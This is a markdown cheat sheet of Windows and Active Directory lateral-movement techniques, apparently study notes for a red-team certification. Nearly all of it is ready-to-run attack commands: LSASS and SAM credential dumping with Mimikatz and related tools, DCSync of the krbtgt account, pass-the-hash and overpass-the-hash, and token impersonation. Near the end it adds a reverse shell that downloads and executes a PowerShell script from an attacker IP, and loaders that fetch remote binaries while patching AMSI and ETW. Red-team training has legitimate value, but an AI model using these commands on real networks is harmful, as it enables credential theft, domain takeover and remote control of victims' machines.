# Lateral Movement
* [General](#General)
* [Gathering Credentials](#Gathering-credentials)
  * [Find credentials in files](#Find-credentials-in-files)
  * [Dumping LSASS](#Dumping-LSASS)
  * [Dumping SAM](#Dumping-SAM)
  * [Mimikatz](#Mimikatz) 
  * [DC-Sync](#DC-Sync)
  * [Token manipulation](#Token-manipulation)
* [Pass The Hash](#Pass-The-Hash)
  * [Overpass The Hash](#Overpass-The-Hash)
* [Check Local Admin Access](#Check-Local-Admin-Access)  
* [Offensive .NET](#Offensive-.NET)

## General
#### Add domain user to localadmin
```
net localgroup Administrators <DOMAIN>\<USER> /add
```

#### Connect to machine with administrator privs
```
Enter-PSSession -Computername <COMPUTERNAME>
$sess = New-PSSession -Computername <COMPUTERNAME>
Enter-PSSession $sess
```

#### PSremoting NTLM authetication (after overpass the hash)
```
Enter-PSSession -ComputerName <COMPUTERNAME> -Authentication Negotiate 
```

#### Execute commands on a machine
```
Invoke-Command -Computername <COMPUTERNAME> -Scriptblock {<COMMAND>} 
Invoke-Command -Scriptblock {<COMMAND>} $sess
```

#### Load script on a machine
```
Invoke-Command -Computername <COMPUTERNAME> -FilePath <PATH>
Invoke-Command -FilePath <PATH> $sess
```

#### Execute locally loaded function on a list of remote machines
```
Invoke-Command -Scriptblock ${function:<function>} -Computername (Get-Content computers.txt)
Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Content computers.txt)
```

#### Runas other user
```
runas /netonly /user:<DOMAIN>\<USER> cmd.exe
runas /netonly /user:<DOMAIN>\<USER> powershell.exe
```

## Gathering credentials
### Find credentials in files
#### Look for SAM files
```
Get-ChildItem -path C:\Windows\Repair\* -include *.SAM*,*.SYSTEM* -force -Recurse 
Get-ChildItem -path C:\Windows\System32\config\RegBack\*  -include *.SAM*,*.SYSTEM* -force -Recurse
Get-ChildItem -path C:\* -include *.SAM*,*.SYSTEM* -force -Recurse 
```

#### Check registery for passwords
```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

#### Look for unattend and sysgrep files
```
Get-ChildItem -path C:\* -Recurse -Include *Unattend.xml*
Get-ChildItem -path C:\Windows\Panther\* -Recurse -Include *Unattend.xml* 
Get-ChildItem -path C:\Windows\system32\* -Recurse -Include *sysgrep.xml*, *sysgrep.inf* 
Get-ChildItem -path C:\* -Recurse -Include *Unattend.xml*, *sysgrep.xml*, *sysgrep.inf* 
```

#### Look for powershell history files
```
Get-Childitem -Path C:\Users\* -Force -Include *ConsoleHost_history* -Recurse -ErrorAction SilentlyContinue
```

#### Look for hardcoded passwords in scripts
```
Get-ChildItem -path C:\*  -Recurse -Include *.xml,*.ps1,*.bat,*.txt  | Select-String "password"| Export-Csv C:\Scripts\Report.csv -NoTypeInformation
Get-ChildItem -path C:\*  -Recurse -Include *.xml,*.ps1,*.bat,*.txt  | Select-String "creds"| Export-Csv C:\Scripts\Report.csv -NoTypeInformation
```

#### Check for Azure tokens
```
Get-ChildItem -path "C:\Users\*" -Recurse -Include *accessTokens.json*, *TokenCache.dat*, *AzureRmContext.json*
```

#### Dump password vault
```
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | % { $_.RetrievePassword();$_ }
```

### Dumping LSASS
#### Crackmapexec
```
cme smb <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH> --lsa
cme smb <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH> -M lsassy
```

#### Dump credentials on a local machine using Mimikatz.
```
Invoke-Mimikatz -Command '"sekurlsa::ekeys"' 
```

#### Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
```
SafetyKatz.exe "sekurlsa::ekeys"
```

#### Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality).
```
SharpKatz.exe --Command ekeys
```

#### Dump credentials using Dumpert (Direct System Calls and API unhooking)
```
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
```

#### Using pypykatz (Mimikatz functionality in Python)
```
pypykatz.exe live lsa
```

#### Using comsvcs.dll
```
tasklist /FI "IMAGENAME eq lsass.exe" 
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS PROCESS ID> C:\Users\Public\lsass.dmp full
```

## Dumping SAM
#### Crackmapexec
```
cme smb <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH> --lsa
cme smb <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH> -M lsassy
```

#### Mimikatz dump SAM
```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'
```

or

```
reg save HKLM\SAM SamBkup.hiv
reg save HKLM\System SystemBkup.hiv
#Start mimikatz as administrator
privilege::debug
token::elevate
lsadump::sam SamBkup.hiv SystemBkup.hiv
```

## Mimikatz
- Check out https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md for more commands

#### Mimikatz dump credentials on local machine
```
Invoke-Mimikatz -Dumpcreds
```

#### Mimikatz dump credentials on multiple remote machines
```
Invoke-Mimikatz -Dumpcreds -ComputerName @("<COMPUTERNAME 1>","<COMPUTERNAME2>")
```

#### Mimikatz dump certs
```
Invoke-Mimikatz –DumpCerts
```

#### Mimikatz dump vault
```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "vault::cred /patch" "vault::list"'
```

#### Mimikatz dump all to find privs
```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "sekurlsa::tickets /export" "kerberos::list /export" "vault::cred /patch" "vault::list" "lsadump::sam" "lsadump::secrets" "lsadump::cache"'
```

## DC Sync
- Extract creds from the DC without code execution using DA privileges.

#### Mimikatz DCSync attack
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
```

#### Safetykatz.exe
```
SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```

## Token manipulation
- https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1

#### List all tokens on a machine
```
Invoke-TokenManipulation –ShowAll
```

#### List all unique, usable tokens on the machine
```
Invoke-TokenManipulation -Enumerate
```

#### Start a new process with token of a specific user
```
Invoke-TokenManipulation -ImpersonateUser -Username “domain\user"
```

#### Start news process with token of another process
```
Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -ProcessId 500
```

## Get the wifi password (Not CRTE)
### Get saved wifi networks
```
netsh wlan show profiles
```

#### Get key from saved wifi network
```
netsh wlan show profiles name=<NAME> key=clear
```

## Check Local Admin Access
#### Crackmapexec
```
cme smb <COMPUTERLIST> -d <DOMAIN> -u <USER> -H <NTLM HASH>
```

#### Powerview
```
Find-LocalAdminAccess -Verbose
```

### Other scripts
```
. ./Find-WMILocalAdminAccess.ps1
Find-WMILocalAdminAccess
```

```
. ./Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```

## Pass the hash
#### Impacket
- Use the empty lm hash ```00000000000000000000000000000000```
- https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.22.dev-binaries
```
.\psexec_windows.exe -hashes <LM HASH>:<NTLM HASH> <DOMAIN>/<USER>@<COMPUTERNAME>
```

#### Crackmapexec
- Required elevated privileges to execute commands
```
cme smb <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH> -X <COMMAND>
```

#### Invoke-TheHash
- https://github.com/Kevin-Robertson/Invoke-TheHash
- Can use the command ```net localgroup administrators <DOMAIN>\<USERNAME> /add``` and do ```enter-pssession``` after to connect 
```
Invoke-SMBExec -Target <COMPUTERNAME> -Domain <DOMAIN> -Username <USERNAME> -Hash <NTLM HASH> -Command <COMMAND> -Verbose
```

#### Psexec
- Seems to only work with password or after a overpass the hash attack with Mimikatz!
```
.\PsExec64.exe \\<COMPUTERNAME> -accepteula -u <DOMAIN>\<ADMINISTRATOR -p <PASSWORD> cmd.exe
.\PsExec64.exe \\<COMPUTERNAME> -accepteula 
```

### Overpass The Hash
- Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs elevation (Run as administrator)

#### Mimikatz overpass the hash
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256KEYS> /run:powershell.exe"'
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:powershell.exe"'
```

#### SafetyKatz
```
SafetyKatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256KEYS> /run:cmd.exe" "exit" 
```

#### Rubeus
- Below doesn't need elevation
```
Rubeus.exe asktgt /user:<USER> /rc4:<NTLM HASH> /ptt
```

- Below command needs elevation
```
Rubeus.exe asktgt /user:<USER> /aes256:<AES256KEYS> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

### Double hop
#### Pssession in pssession
```
Enter-PSSession -ComputerName <NAME>
$sess = New-PSSession <SERVER> -Credential <DOMAIN>\<USER>
Invoke-Command -Scriptblock {hostname; whoami;} -Session $sess
```

#### Overpass the hash mimikatz reverse shell
```
powercat -l -v -p 444 -t 5000

$sess = New-PSSession <SERVER> 
#.ps1 is a reverse shell back to the attacker machine, make sure you run it as the user you want
$Contents = 'powershell.exe -c iex ((New-Object Net.WebClient).DownloadString(''http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1''))'; Out-File -Encoding Ascii -InputObject $Contents -FilePath reverse.bat
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:C:\reverse.bat"'
```

## Offensive .NET
- https://github.com/Flangvik/NetLoader
- Load binary from filepath or URL and patch AMSI & ETW while executing
```
C:\Users\Public\Loader.exe -path http://xx.xx.xx.xx/something.exe
```

#### Use custom exe Assembyload to run netloader in memory and then load binary
```
C:\Users\Public\AssemblyLoad.exe http://xx.xx.xx.xx/Loader.exe -path http://xx.xx.xx.xx/something.exe
```
